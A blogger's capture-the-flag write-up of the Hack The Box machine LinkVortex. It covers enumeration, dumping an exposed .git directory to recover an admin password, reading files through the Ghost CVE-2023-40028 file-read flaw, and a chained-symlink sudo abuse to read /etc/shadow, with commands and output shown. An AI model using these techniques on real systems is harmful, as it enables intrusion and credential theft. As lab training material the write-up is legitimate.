---
layout: post
title: "LinkVortex"
date: 2025-04-12
categories: [htb, easy]
provider: htb
machine: linkvortex
---

Welcome! We are finally here: this is the first of my Honest Write-ups to be blinded by the light of day. I rooted my first few Hack The Box machines back in October/November last year, when I started [the CPTS path](https://academy.hackthebox.com/preview/certifications/htb-certified-penetration-testing-specialist), but then focused on studying. It was actually during the exam that the idea for these came to mind. An honest report would be _very_ different. "The tester made a stupid typo and assumed the target machine was down", or "at this point, the tester was stuck for days". Now that CPTS is out of the way, I'm back to solving these machines, and will write honestly about them.

LinkVortex, and another easy-rated machine that I won't name yet (still active), made me worry. I stumbled my way to root on a few easy boxes at the start of my CPTS path. I rooted a few more after CPTS, graduating to medium machines and feeling almost at ease. Then I tried that other easy one, and I got _nothing_. Staring at a web application's login page, all the enumeration steps I knew of done, all the very few options exhausted. Stunned, I set it aside and moved on to LinkVortex, one week before its retirement.

## Up-beat retro synthwave music on
It always starts the same way - a quick `nmap` shows SSH & HTTP only, and the full TCP scan confirms it later on:
```
$ sudo nmap -p- -sV 10.10.11.47 -vv -oA full-tcp
<SNIP>
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Browsing to the web application finds an instance of [Ghost](https://ghost.org/), yet another open-source Content Management System. There isn't much to note for now, aside from the login page we find with the help of the documentation, at `http://linkvortex.htb/ghost/#/signin`. After trying some common credentials for the `admin@linkvortex.htb` account, the author of the posts on the site, we move on to see what else we can find.

Looking for vulnerabilities on this version of Ghost (5.58) finds a few, including an arbitrary file read that will surely be useful as soon as we manage to authenticate, but nothing too useful for now. There is a way to bypass the site's login brute-force protection, so I used that to try 200 common passwords in case that was the intended path. It usually isn't though, and it wasn't here either.

Fuzzing subdirectories doesn't find much, but doing the same for virtual hosts does:
```
$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u  http://linkvortex.htb/ -H 'Host: FUZZ.linkvortex.htb' -fw 14

<SNIP>
dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 27ms]
<SNIP>
```

Browsing to that finds a simple "launching soon" page. Its source doesn't tell us anything, and fuzzing subdirectories _with my usual list_ finds absolutely nothing:
```
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://dev.linkvortex.htb/FUZZ  -ic

<SNIP>
                        [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 23ms]
server-status           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 22ms]
<SNIP>
```

The good thing about web enumeration is that there's not a lot to try, that I know of at least. If we face a custom application, sure, there's plenty of things to try. But if the only apps we find are commercial or open-source, these challenges don't really expect us to find vulnerabilities that are not already public. I had to remind myself of that while messing with the app's API in Burp. But I had fuzzed directories, v-hosts, v-hosts of that v-host, parameters, checked `robots.txt`, `sitemap.xml`, pretty much everything from my notes... and I got _nothing_.

I probably shouldn't, but I usually only run tools like `nikto` last. Maybe it's because those manual enumeration steps usually do the trick, and I tend to think about them first. Anyway, `nikto` found a `.git` directory on the `dev` v-host:
```
$ nikto -h dev.linkvortex.htb
<SNIP>
+ /.git/index: Git Index file may contain directory listing information.
+ /.git/config: Git config file found. Infos about repo details may be present.
<SNIP>
```

This annoyed me, but it was a good lesson learned for the future. It turns out that `directory-list-2.3-medium.txt` does not include some pretty common directories. So note to self: also use `common.txt`...
```
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://dev.linkvortex.htb/FUZZ

<SNIP>
.git/config             [Status: 200, Size: 201, Words: 14, Lines: 9, Duration: 27ms]
.git                    [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 28ms]
.htaccess               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 29ms]
.htpasswd               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 29ms]
.git/HEAD               [Status: 200, Size: 41, Words: 1, Lines: 2, Duration: 29ms]
.hta                    [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 29ms]
.git/logs/              [Status: 200, Size: 868, Words: 59, Lines: 16, Duration: 28ms]
.git/index              [Status: 200, Size: 707577, Words: 2171, Lines: 2172, Duration: 27ms]
cgi-bin/                [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 23ms]
index.html              [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 24ms]
server-status           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 25ms]
<SNIP>
```

This was exciting for just a bit, because by browsing the files in the `.git` directory I thought it was just a clone of the Ghost GitHub repository, as indicated by the `.git/logs/HEAD` file. Nothing stood out either while painstakingly checking strings in the `.git/index` file. I fuzzed the `cgi-bin` directory for, well, CGI bins, with a few educated guesses but with no results. 

## Darkest just before dawn
Here I was again. Staring at a web application's login page, all the enumeration steps I knew of done, all the very few options exhausted. Double stunned, thinking that my web enumeration skills were clearly lacking even for Easy HTB boxes, and also worried, because LinkVortex is mentioned in [Tj Null's famous list](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview) of machines to prepare for the OSCP exam, which I was then working on.

I started listing what I had found in this box, and which of those things I might not know how to thoroughly enumerate. Arrogantly, in retrospect, the only item on that list was the `cgi-bin` directory. Maybe CPTS didn't teach me everything there was to know about these, so I turned to google and ended up, as usual, on HackTricks' page on CGI. It didn't actually tell me all that much, but a few items below it, on the menu, was [their entry on Git](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/git.html).

I've been using Git daily and professionally, as a Software Engineer, for about 10 years now. So what I'm about to tell you is more than mildly embarrassing.

The first thing that HackTricks says is "To dump a `.git` folder from a URL use [git-dumper](https://github.com/arthaud/git-dumper)". I did think "so what, I can just browse the directory", but I had a look. I did say "yeah, I checked that" a few more times while reading the "How does it work" section, until the last sentence hit me: _"Run `git checkout .` to recover the current working tree."_

_What!_ You can do that?! Well, how many times in those 10 years did I restore changes? What's the difference between getting one deleted file back to the tracked state, and getting _all_ deleted files back? Of course you can do that. So I used my new best friend to do that:
```
$ pipx install git-dumper                                               
<SNIP>
$ git-dumper http://dev.linkvortex.htb/.git .
<SNIP>
[-] Running git checkout .
Updated 5596 paths from the index

$ ls -lah
total 1.4M
drwxrwxr-x  7 kali kali 4.0K Apr  8 11:55 .
drwxrwxr-x  3 kali kali 4.0K Apr  8 11:54 ..
drwxrwxr-x  8 kali kali 4.0K Apr  8 11:55 apps
-rw-rw-r--  1 kali kali  521 Apr  8 11:55 Dockerfile.ghost
-rw-rw-r--  1 kali kali  312 Apr  8 11:55 .editorconfig 
drwxrwxr-x 80 kali kali 4.0K Apr  8 11:55 ghost
drwxrwxr-x  7 kali kali 4.0K Apr  8 11:55 .git
-rw-rw-r--  1 kali kali  122 Apr  8 11:55 .gitattributes
drwxrwxr-x  7 kali kali 4.0K Apr  8 11:55 .github
-rw-rw-r--  1 kali kali 3.1K Apr  8 11:55 .gitignore
-rw-rw-r--  1 kali kali  135 Apr  8 11:55 .gitmodules
-rw-rw-r--  1 kali kali 1.1K Apr  8 11:55 LICENSE
-rw-rw-r--  1 kali kali  888 Apr  8 11:55 nx.json
-rw-rw-r--  1 kali kali 3.5K Apr  8 11:55 package.json
-rw-rw-r--  1 kali kali 2.8K Apr  8 11:55 PRIVACY.md
-rw-rw-r--  1 kali kali 5.3K Apr  8 11:55 README.md
-rw-rw-r--  1 kali kali  518 Apr  8 11:55 SECURITY.md
drwxrwxr-x  2 kali kali 4.0K Apr  8 11:55 .vscode
-rw-rw-r--  1 kali kali 1.4M Apr  8 11:55 yarn.lock
```

This was cool for a second. Most of those files were exactly what we could already find on the public repository for this version, and the one new file `Dockerfile.ghost` didn't provide anything actionable for now. I was trying a few `grep`s that came to mind, until I realised that if the `checkout` had recovered a new file, there might have been additional changes in the working tree. And indeed there were:
```
$ git status                
Not currently on any branch.
Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
        new file:   ../../Dockerfile.ghost
        modified:   ../../ghost/core/test/regression/api/admin/authentication.test.js

$ git diff HEAD ghost/core/test/regression/api/admin/authentication.test.js  
<SNIP>
-            const password = 'thisissupersafe';
+            const password = '<REDACTED>';
<SNIP>
```

We snap throw that password at the Ghost login page, and authenticate successfully. It feels like it was ages ago that we found that arbitrary file read vulnerability, but it's finally time to use one of the several proof-of-concept scripts available. I went with [CVE-2023-40028 PoC](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028), which is awkwardly interactive but does the job:
```
$ ./CVE-2023-40028 -u admin@linkvortex.htb -p <REDACTED> -h http://linkvortex.htb
WELCOME TO THE CVE-2023-40028 SHELL
Enter the file path to read (or type 'exit' to quit):
```

The other file in the Git repository, `Dockerfile.ghost`, points us towards a few files that could be interesting to check. `config.production.json` is the one with the reward:
```
Enter the file path to read (or type 'exit' to quit): /var/lib/ghost/config.production.json
File content:
<SNIP>
        "user": "bob@linkvortex.htb",
        "pass": "<REDACTED>"
```

Fi-na-lly, \[hacker voice\] _we're in..._
```
$ ssh bob@linkvortex.htb
bob@linkvortex.htb's password:
<SNIP>
bob@linkvortex:~$ ls -lah
<SNIP>
-rw-r----- 1 root bob    33 Apr  8 06:18 user.txt
```

## The rest
The rest was fairly simple. The second of the Compulsory Couple of Commands we always run after landing on a Linux box (`id` and `sudo -l`) shows us that we'll be trying to abuse this script:
```
$ cat /opt/ghost/clean_symlink.sh
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !" 
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

In English: take a `.png` file, and check if it is a symbolic link. If it is, then
- if it targets a file that has `etc` or `root` anywhere in the path, remove it;
- otherwise, move it to another folder, and possibly print its content.

The limitation on `etc` and `root` looked solid, so I started by checking other potentially interesting files that I couldn't read, like the `docker-compose.yml` file:
```
$ ln -s /opt/ghost/docker-compose.yml dude.png                        
$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
Link found [ dude.png ] , moving it to quarantine
Content:
<SNIP>
      - MYSQL_ROOT_PASSWORD=<REDACTED>
      - MYSQL_USER=ghost
      - MYSQL_PASSWORD=<REDACTED>
      - MYSQL_DATABASE=ghostdb
```

I thought this was it, root is probably reusing that password. But throwing those credentials over SSH did not work. I spent some time trying to figure out if having access to that database could be the way, but it looked more and more like a rabbit-hole.

I eventually wondered if the script would work properly if I created a link-to-a-link. In other words, a `.png` file linking to a `.txt` file, which in turn linked to a target file we do not have access to, like `/etc/shadow`. Examinig the script, it looked like this could work, but the first attempt was unsuccessful:
```
$ export CHECK_CONTENT=true
$ ln -s /etc/shadow dude.txt
$ ln -s dude.txt dude.png                                              
$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
Link found [ dude.png ] , moving it to quarantine
Content:
```

At first I thought that the empty content was due to `stderr` being redirected to `/dev/null`, so I was not seeing a `"Permission denied"` kind of message. But that didn't make any sense given what the script is programmed to do. Then I noticed the link after it got moved to `/var/quarantine`:
```
$ ls -lah /var/quarantined/
<SNIP>
lrwxrwxrwx  1 bob  bob     8 Apr  8 12:46 dude.png -> dude.txt
```

It was still pointing to a `dude.txt` file, which was still on my current working directory... so that couldn't possibly work. Lets try with a full path instead:
```
$ ln -s /etc/shadow dude.txt
$ ln -s /tmp/.ICE-unix/.dontcheat/dude.txt dude.png
$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
Link found [ dude.png ] , moving it to quarantine
Content:
root:$y$j9T$C<REDACTED>A:19814:0:99999:7:::
<SNIP>
```

## Roll the credits
I hope you've enjoyed this. "Administrator" is retiring next week, so I'll be back with more soon. I'll finish these write-ups with a summary of lessons learned, a good old tl;dr except it's at the end:
- I solemnly swear to always fuzz with `common.txt` as well from now on;
- 10 years later, I suddenly understand an everyday tool much better...
- for reading this far, you're a champ.
